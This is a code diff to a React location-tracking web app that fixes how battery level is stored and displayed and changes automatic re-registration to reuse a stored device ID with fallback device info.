@@ -84,7 +84,7 @@ function App() {
   const [geofence, setGeofence] = useState(null);
   const [isOnline, setIsOnline] = useState(true);
   const [pendingPings, setPendingPings] = useState([]);
-  const [batteryLevel, setBatteryLevel] = useState(100);
+  const [batteryLevel, setBatteryLevel] = useState(-1);
   const [socket, setSocket] = useState(null);
   const [isConnected, setIsConnected] = useState(false);
 
@@ -101,6 +101,7 @@ function App() {
   const isOnlineRef = useRef(true);
   const lastPingRef = useRef({ lat: 0, lng: 0, time: 0 }); // Dedup pings
   const batteryRef = useRef(null); // Cached battery object
+  const batteryLevelRef = useRef(-1); // Stable battery level for callbacks
   const cameraStreamRef = useRef(null); // Active camera MediaStream
   const cameraIntervalRef = useRef(null); // Frame capture interval
   const cameraVideoRef = useRef(null); // Video element for camera
@@ -118,6 +119,9 @@ function App() {
   useEffect(() => {
     isOnlineRef.current = isOnline;
   }, [isOnline]);
+  useEffect(() => {
+    batteryLevelRef.current = batteryLevel;
+  }, [batteryLevel]);
 
   // =============================================
   // INITIALIZATION
@@ -570,8 +574,14 @@ function App() {
         }
         // Auto re-register instead of showing login
         setScreen(SCREEN.INSTALLING);
-        const info = await collectDeviceInfo();
-        await autoInstall(DEFAULT_MEMBER_ID, info);
+        autoInstall(
+          deviceIdRef.current,
+          deviceInfo || {
+            model: "Device",
+            operatingSystem: "Web",
+            osVersion: "",
+          },
+        );
         return;
       }
       if (!response.ok) return;
@@ -691,9 +701,8 @@ function App() {
     } catch (e) {
       batteryRef.current = null;
     }
-    // If we have a previously updated batteryLevel from monitoring, use it
-    // Otherwise return -1 so the server knows battery is unavailable
-    return batteryLevel > 0 ? batteryLevel : -1;
+    // Use ref to avoid stale closure — return -1 if battery is unknown
+    return batteryLevelRef.current > 0 ? batteryLevelRef.current : -1;
   };
 
   const stopTracking = () => {
@@ -1554,7 +1563,7 @@ function App() {
             }}
           >
             <span style={{ opacity: 0.6 }}>Battery</span>
-            <span>🔋 {batteryLevel}%</span>
+            <span>🔋 {batteryLevel >= 0 ? `${batteryLevel}%` : "Detecting..."}</span>
           </div>
           {isActive && lastPingTime && (
             <div
